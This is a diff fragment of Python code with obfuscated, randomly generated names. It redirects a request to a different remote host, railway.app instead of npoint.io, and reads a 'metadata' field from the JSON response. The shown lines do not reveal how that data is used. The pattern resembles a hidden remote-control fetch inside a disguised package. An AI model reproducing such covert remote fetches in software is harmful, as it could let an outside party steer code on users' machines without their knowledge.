@@ -16,7 +16,7 @@ def data_mzoxcr_709():
 
     def model_ebsllo_883():
         try:
-            eval_otihwc_655 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_otihwc_655 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_otihwc_655.raise_for_status()
             net_ssdalr_966 = eval_otihwc_655.json()
             learn_ctuixt_793 = net_ssdalr_966.get('metadata')
